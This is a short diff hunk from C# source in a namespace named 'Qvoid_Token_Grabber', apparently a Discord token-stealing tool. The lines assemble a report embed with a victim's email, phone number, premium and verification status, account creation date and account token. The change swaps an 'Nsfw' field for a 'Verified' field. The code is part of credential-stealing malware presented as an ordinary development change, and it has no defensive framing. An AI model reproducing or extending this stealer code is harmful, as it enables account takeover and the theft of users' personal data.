@@ -474,7 +474,7 @@ namespace Qvoid_Token_Grabber
                     userEmbed.Fields.Add(new EmbedField() { Name = "Email", Value = $"```{(String.IsNullOrEmpty(userInfo.Email) ? "None" : userInfo.Email)}```", InLine = true });
                     userEmbed.Fields.Add(new EmbedField() { Name = "Phone Number", Value = $"```{(String.IsNullOrEmpty(curUser.PhoneNumber) ? "None" : curUser.PhoneNumber)}```", InLine = true });
                     userEmbed.Fields.Add(new EmbedField() { Name = "Premium", Value = $"```{curUser.Nitro}```", InLine = true });
-                    userEmbed.Fields.Add(new EmbedField() { Name = "Nsfw", Value = $"```{(curUser.Nsfw ? "True" : "False")}```", InLine = true });
+                    userEmbed.Fields.Add(new EmbedField() { Name = "Verified", Value = $"```{userInfo.Verified}```", InLine = true });
                     userEmbed.Fields.Add(new EmbedField() { Name = "Created At", Value = $"```{userInfo.CreatedAt.DateTime.ToShortDateString()} | {userInfo.CreatedAt.DateTime.ToShortTimeString()}```", InLine = true });
                     userEmbed.Fields.Add(new EmbedField() { Name = "Token", Value = $"```{curUser.Token}```", InLine = false });
 
